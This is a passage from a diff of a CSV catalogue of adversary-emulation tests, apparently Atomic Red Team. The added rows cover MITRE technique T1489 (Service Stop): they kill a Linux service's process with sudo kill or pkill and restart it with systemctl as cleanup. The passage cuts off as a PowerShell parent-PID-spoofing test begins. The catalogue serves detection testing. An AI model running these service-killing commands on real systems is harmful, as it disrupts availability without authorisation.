+input_arguments.process_name.default: cron
+
+input_arguments.service_name.description: Name of a service to restart
+
+input_arguments.service_name.type: string
+
+input_arguments.service_name.default: cron
+
+"
+T1489,Service Stop,Linux - Stop service by killing process using kill,332f4c76-7e96-41a6-8cc2-7361c49db8be,"Stops a specified service by sending a SIGTERM signal to the linked process using the kill command. Upon execution, if the service's main process was running, it will be terminated.
+If the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.
+You can list all available services with following command: ""systemctl list-units --type=service""
+",linux,,,"sudo kill -SIGTERM $(pgrep #{process_name})
+",sh,True,,"sudo systemctl start #{service_name} 2> /dev/null
+",,,"input_arguments.process_name.description: Name of a process to kill
+
+input_arguments.process_name.type: string
+
+input_arguments.process_name.default: cron
+
+input_arguments.service_name.description: Name of a service to restart
+
+input_arguments.service_name.type: string
+
+input_arguments.service_name.default: cron
+
+"
+T1489,Service Stop,Linux - Stop service by killing process using pkill,08b4718f-a8bf-4bb5-a552-294fc5178fea,"Stops a specified service by sending a SIGTERM signal to the linked process using pkill. This method is effective when multiple instances of the process may be running.
+Upon execution, if any instances of the process were running, they will be terminated. If no instances were running, pkill will not find any processes to kill.
+Stopped service can be restarted by running the cleanup command.
+You can list all available services with following command: ""systemctl list-units --type=service""
+",linux,,,"sudo pkill -SIGTERM #{process_pattern}
+",sh,True,,"sudo systemctl start #{service_name} 2> /dev/null
+",,,"input_arguments.process_pattern.description: Pattern to match the name of the process to kill
+
+input_arguments.process_pattern.type: string
+
+input_arguments.process_pattern.default: ^cron$
+
+input_arguments.service_name.description: Name of a service to restart
+
+input_arguments.service_name.type: string
+
+input_arguments.service_name.default: cron
 
 "
 T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing using PowerShell,069258f4-2162-46e9-9a25-c9c6c56150d2,"This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
